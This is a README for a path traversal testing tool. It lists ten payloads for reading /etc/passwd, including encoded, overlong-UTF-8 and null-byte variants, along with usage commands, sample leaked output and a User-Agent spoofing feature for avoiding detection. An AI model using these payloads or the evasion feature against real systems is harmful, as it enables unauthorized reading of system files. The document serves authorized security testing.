# Dynamic Path Traversal Tester (GET)

## Overview
This script is a **dynamic path traversal testing tool** designed to identify potential vulnerabilities in web applications.  
It attempts multiple traversal techniques against a given endpoint and detects whether responses resemble sensitive files such as `/etc/passwd`.

- Supports testing **single or multiple URLs**.  
- Automatically detects parameters to inject if none are specified.  
- Provides two modes of output:  
  - **Verbose (`--verbose`)**: detailed raw request/response info (original style).  
  - **Non-verbose (default)**: concise, professional output with colors.  

---

## Features
- Built-in **10 traversal payload techniques**.
- Automatic detection of `/etc/passwd`-like content.
- Optional **list of URLs** input.
- Configurable delay and timeout.
- Support for ignoring TLS verification (`--insecure`).
- Support for following redirects (`--follow`).
- **User-Agent spoofing** to avoid detection.

---

## Requirements
- Python **3.7+**
- Install dependencies:
  ```bash
  pip install requests colorama
  ```

---

## Techniques Included

| ID   | Description                          | Example Payload                               |
|------|--------------------------------------|-----------------------------------------------|
| T01  | Absolute path                        | `/etc/passwd`                                 |
| T02  | Simple traversal `../` ×6            | `../../../../../../etc/passwd`                |
| T03  | Nested traversal `....//` ×3         | `....//....//....//etc/passwd`                |
| T04  | Nested traversal `....\/` ×3        | `....\/....\/....\/etc/passwd`             |
| T05  | Single URL-encoded `../` ×3          | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`       |
| T06  | Double URL-encoded `../` ×3          | `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd` |
| T07  | Non-standard `..%c0%af` ×3           | `..%c0%af..%c0%af..%c0%afetc/passwd`          |
| T08  | Non-standard `..%ef%bc%8f` ×3        | `..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd` |
| T09  | Base-dir bypass                      | `/var/www/images/../../../etc/passwd`         |
| T10  | Null byte terminator `.png`          | `../../../etc/passwd%00.png`                  |

---

## Usage
### Test a single URL
```bash
python3 traversal_tester.py -u "http://localhost:8080/download?file=test.txt"
```

### Specify a parameter
```bash
python3 traversal_tester.py -u "http://localhost:8080/download" -p filename
```

### Test multiple URLs from a file
```bash
python3 traversal_tester.py --list targets.txt
```

### Enable verbose mode (detailed output)
```bash
python3 traversal_tester.py -u "http://localhost:8080/download" --verbose
```

---

## Example Output

### Default (non-verbose, colored)
```
[TARGET] http://localhost:8080/download
[T01] Absolute path (filename) → No match
[T02] Simple traversal ../ x6 (filename) → POSSIBLE LEAK!
[✓] No /etc/passwd leak detected
```

### Verbose
```
[+] Target: http://localhost:8080/download
[+] Params: filename
[+] Techniques: 10

T02 | Simple traversal ../ x6 | param=filename
    URL     : http://localhost:8080/download?filename=../../../../etc/passwd
    Status  : 200  Size: 1423 bytes
    RESULT  : POSSIBLE /etc/passwd LEAK ✅
      > root:x:0:0:root:/root:/bin/bash
      > daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

## Disclaimer
This tool is intended **for educational and authorized penetration testing purposes only**.  
The author is **not responsible for misuse or damage** caused by this script.
